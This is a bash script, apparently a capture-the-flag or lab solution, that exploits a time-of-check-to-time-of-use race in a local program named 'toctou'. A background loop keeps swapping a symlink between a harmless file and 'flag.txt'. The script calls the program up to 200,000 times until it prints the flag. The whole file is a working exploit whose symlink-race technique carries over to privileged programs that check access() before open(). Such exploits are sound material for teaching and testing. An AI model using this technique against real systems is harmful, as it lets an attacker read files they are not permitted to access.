#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")"

TARGET="victim_link"
SAFE="dummy_file.txt"
SECRET="flag.txt"

ln -sfn "$SAFE" "$TARGET"

(
  while true; do
    ln -sfn "$SAFE" "$TARGET"
    ln -sfn "$SECRET" "$TARGET"
  done
) &
SWAP_PID=$!

cleanup() {
  kill "$SWAP_PID" 2>/dev/null || true
  wait "$SWAP_PID" 2>/dev/null || true
}
trap cleanup EXIT

for i in $(seq 1 200000); do
  output=$(./toctou "$TARGET" 2>/dev/null || true)
  if grep -q 'flag{' <<<"$output"; then
    echo "[+] Success on attempt $i"
    echo "$output"
    exit 0
  fi

done

echo "[-] No success yet. Try increasing attempts or adding a short sleep in toctou.c between access() and open() for debugging." >&2
exit 1
